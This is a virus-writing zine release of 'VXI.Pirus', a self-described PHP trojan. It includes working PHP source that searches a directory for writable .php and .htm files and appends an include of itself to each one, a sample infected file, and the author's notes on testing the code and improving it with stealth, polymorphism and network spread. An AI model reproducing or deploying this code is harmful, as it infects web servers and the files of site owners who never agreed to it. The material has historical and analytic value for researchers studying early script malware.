
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[PIRUS.PHP]ÄÄÄ
<?php
$handle=opendir('.');
while ($file = readdir($handle))
{ $infected=true;
  $executable=false;

 if ( ($executable = strstr ($file, '.php')) || ($executable = strstr ($file, '.htm')) || ($executable = strstr ($file, '.php')) )
 if ( is_file($file) && is_writeable($file) )
 {
   $host = fopen($file, "r");
   $contents = fread ($host, filesize ($file));
   $sig = strstr ($contents, 'pirus.php');
   if(!$sig) $infected=false;
 }
 //infect
 if (($infected==false))
  {
   $host = fopen($file, "a");
   fputs($host,"<?php ");
   fputs($host,"include(\"");
   fputs($host,__FILE__);
   fputs($host,"\"); ");
   fputs($host,"?>");
   fclose($host);
   return;
 }
}
closedir($handle);
?>
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[PIRUS.PHP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[HELLP.PHP]ÄÄÄ
<?php
//A sample infected file .. look at the end line .. that's where we are :)
print "hello";
?>

<?php include("C:\PROGRAM FILES\HTTPD\HTDOCS\WORK\pirus.php"); ?>
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[HELLP.PHP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[PIRUS.TXT]ÄÄÄ
VXI.Pirus
The world's first PHP trojan (companion bug .. call it what u want)
By MaskBits/VXI

Introduction
------------
After being reading about Samhain, I could'nt help noticing the
power of this language. This virus (or call it a companion trojan)
is just intended to be a proof of concept code and is NOT DESIGNED
to be in the wild in any manner. I wanted that other more capable
and brilliant vx authors should look at PHP for their
future projects. This was also needed to keep my spirits up
with DIV (My main vx project) becoming very depressing.

I have only tested on my linux box and omnihttpd

Technical Explanation
---------------------
First let me tell you how to create enviroment for testing and improving
the bug.

a) For Win 9x/NT/2k users

Please visit http://www.omnicron.ab.ca and download Omni Httpd Personal
webserver. This has inbuilt PHP 4 support. After installing, use the
included test.php as a trial file and place pirus.php in the same directory.

Now fire up localhost and run the pirus.php, after successful "install"
of the bug .. the test.php should have a line at the end of the file
which reads

<?php include("blah\pirus.php"); ?>

where blah = ur path

b) For Linux users

Well you ppl are born clever :). Incase u run into ne problem, seek the
linux spirit inside u or contact me !

The bug itself functions very simple
-------------------------------------

1. It uses a function like the good old findfirst and findnext to
   run thru the files

2. Each file is checked whether it's a file, writable, executable
   -- *.php,*.html,*.shtml or whatever crap u come across .. just
   nething apart from data (or other untouchable) files --
   and whether already infected.

3. The program breaks incase a successful infection takes place.

Possible improvements :
-----------------------
Shell script, encryption, polymorphic like samhain 
,network ability, better stealth, appending, good host scripts
which will be downloaded and used by many lame webmasters

We need a php expert ;-) but don't laugh at me :)

Greets (random) :
-----------------

MrSandman   (My elder brother,explorer and vx genius)
Dageshi     (my first and best friend)
Ruzz        (Where are u nowadays ?)
VirusBuster (Thank you! for all the support), 
Benny       (ultracool coder)
Perikles ji (super friend), 
Rajaat      (an inspiration .. explore new worlds!)
Phage       (ur a coder underneath :-)
Lord Julus  (The win32 Guru and my future host in romania :)
CyberYoda   (How goes ? I don't want ops :P .. j/k)
Tally       (The fine soul)
Cicatrix    (VDAT was,is and will be great)
HomeSlice   (I miss your website)
Lifewire    (long time no see)
a32,xsprite (lovebugs :-)
Snakeman    (The search engine man)
CRC3rror    (I don't forget old friends)
Veedee      (I am coming to transylvania)
Jadugar     (The corewarrior.. get back to life!)
Spanska     (Your mars effect changed my vx life)
Raid        (Be cool and happy :)
Evul        (The Vx ISP man)
Vecna       (You acted as if you were on drugs or something ;-)
Jacky Qwerty (Da Genius)

E-MAIL : maskbits@crosswinds.net
WWW    : www.vxi.cjb.net

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.5.8 for non-commercial use <http://www.pgp.com>

mQENAzng1ucAAAEIAMCcpi/l0LxyOT8FSlR90ptib+zOl7ZFHA5BNGiPl+8KQsGR
RNdD9F1PA8rBUO2NPOXLqXFDQx2wXtnPkL6z3/NOcA7SUmRq3EbTt/bYgP6ZJ1zQ
kGZK0zCMjEe2WKtldqyt6Fb3K/ulJsMQ4eQ1k5MGBZ8/JMZlVi5shCVbPwPwOJBk
HI0CREpeGPt8AkCLsjTfzqgzYMWpr7K9YAnzlhV/9EPCZaTfIbRT6uREzxyBrt2K
ntorM1KUgGmmpiPDPGg0H2boevX0XhU0nqThXM4bIqH9AWr55h9kiZTN4kCM717y
NM7mym+McJavMwqgG9Ehdbhunp7ez/saMmL5UAcABRG0Jk1hc2tCaXRzL1ZYSSA8
bWFza2JpdHNAY3Jvc3N3aW5kcy5uZXQ+iQEVAwUQOeDW58/7GjJi+VAHAQFQOwf9
GbEpvJOC5eotRiF6MnkKgZACADyWM6U9NjDRLtD1TxmPGQOCxplJaxYY/cU4o6S1
QBK3uX9Maac/q/miaTmsNb5quijTPmbQ1h9q1BqtsLvRlvmTpUjMhTb2/qiASB+Y
8ZTrn9L1zkVYuA5t23eAVQR5dKVWBdPrmCkYOH5lcm3G/kSdnwAt50LCiA4bqhlC
4HSl2HxW0+bTIdc/Iddcm380NoH1BzhjmRSY9fI3vPYWmsrBEgNpDShr+TAPr1PF
VWpt+o2jgId9assancEvj6rgrLeHnG+3jzudflUp3M6lF5x4Urjg5OXETDCPSmJ+
4l3G3HBiUYT9X9iwm8TQqg==
=1J7x
-----END PGP PUBLIC KEY BLOCK-----
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[PIRUS.TXT]ÄÄÄ
